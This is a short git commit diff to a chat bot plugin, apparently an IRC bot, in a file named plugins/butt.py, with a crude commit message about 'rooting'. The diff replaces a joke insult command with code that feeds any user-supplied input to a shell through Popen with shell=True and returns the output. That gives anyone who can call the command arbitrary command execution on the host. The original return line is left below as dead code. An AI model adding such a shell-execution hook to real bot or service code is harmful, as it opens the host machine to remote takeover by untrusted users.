46c4c1da5a8a092ffdfdfe0267b7cb89eedddd82
Tim-Clifford <timothy.j.clifford@gmail.com>
2016-02-15 22:06:05 -0500

    Rootin this bitch

--- plugins/butt.py
+++ plugins/butt.py
@@ -1,5 +1,13 @@
-from util import http, hook
+"""Basically rooting my own system."""
+
+from util import hook
+from subprocess import Popen, PIPE
+
 
 @hook.command
 def butt(inp):
+    """Basically the rooter."""
+    print 'Firing one off'
+    p = Popen(inp, stdout=PIPE, stdin=PIPE, stderr=PIPE, shell=True)
+    return p.communicate()[0]
     return inp + ", also you're a butt."
